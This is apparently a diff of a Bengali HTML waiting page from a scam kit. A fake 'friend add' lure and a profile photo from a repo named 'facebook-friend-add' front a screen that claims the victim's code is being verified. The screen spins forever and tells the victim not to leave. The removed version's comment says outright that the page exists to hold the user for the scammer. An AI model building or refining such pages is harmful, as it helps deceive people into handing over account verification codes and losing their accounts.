@@ -1,53 +1,62 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>অপেক্ষা করুন...</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { 
-            background-color: #f0f2f5; 
-            font-family: 'Segoe UI', Arial, sans-serif; 
-            height: 100vh; 
-            margin: 0; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-        }
-        .spinner {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #1877f2;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>অপেক্ষা করুন...</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background: #f0f2f5;
+      margin: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+    .spinner {
+      width: 56px;
+      height: 56px;
+      border: 6px solid #e5e7eb;
+      border-top: 6px solid #1877f2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
 </head>
-<body class="bg-[#f0f2f5]">
+<body class="min-h-screen flex flex-col items-center">
 
-    <div class="text-center p-8 bg-white rounded-xl shadow-lg max-w-sm">
-        <div class="spinner mx-auto"></div>
-        <h2 class="text-xl font-bold text-gray-800 mb-4">দয়া করে অপেক্ষা করুন</h2>
-        <p class="text-gray-600 text-lg">
-            অল্প কিছুক্ষণের মধ্যে Mst. Priya Akter এর ফেসবুক আইডি আপনার সাথে অ্যাড হয়ে যাবে।
-        </p>
-        <p class="text-gray-500 mt-6 text-sm">প্রক্রিয়া চলছে... দয়া করে পেজ বন্ধ করবেন না।</p>
-    </div>
+  <!-- ফটো অংশ – page2.html এর সাথে একই লিংক ও স্টাইল -->
+  <div class="w-full max-w-md h-[35vh] overflow-hidden bg-white">
+    <img 
+      src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg"
+      alt="Profile photo"
+      class="w-full h-full object-cover"
+    />
+  </div>
 
-    <!-- অটো সাকসেস পেজে যাওয়ার জন্য (যদি চাও, ৪৫ সেকেন্ড পর অটো রিডাইরেক্ট) -->
-    <script>
-        // অপশনাল: ৪৫ সেকেন্ড পর অটো সাকসেস পেজে যাবে (স্ক্যামারের জন্য ইউজারকে ধরে রাখার জন্য)
-        setTimeout(() => {
-            window.location.href = "success.html";
-        }, 45000);  // ৪৫ সেকেন্ড — চেঞ্জ করতে পারো
-    </script>
+  <!-- ওভারল্যাপ করে ওয়েটিং এরিয়া -->
+  <div class="w-full max-w-md -mt-[20px] bg-white rounded-t-3xl shadow-lg flex-1 flex flex-col items-center justify-center px-6 pt-10">
+
+    <div class="spinner mb-8"></div>
+
+    <h2 class="text-2xl font-bold text-gray-900 mb-3 text-center">
+      যাচাই হচ্ছে...
+    </h2>
+
+    <p class="text-gray-600 text-base text-center leading-relaxed max-w-xs">
+      আপনার কোড যাচাই প্রক্রিয়া চলছে।<br>
+      দয়া করে অপেক্ষা করুন, এটি কয়েক সেকেন্ড সময় নিতে পারে।
+    </p>
+
+    <p class="text-gray-500 text-sm mt-6 text-center">
+      পেজ বন্ধ করবেন না বা ব্যাক বাটন চাপবেন না।
+    </p>
+
+    <!-- কোনো অটো রিডাইরেক্ট নেই – শুধু ঘুরতে থাকবে -->
+    <!-- যদি কোনোদিন চাও তখন setTimeout যোগ করা যাবে -->
+
+  </div>
 
 </body>
 </html>
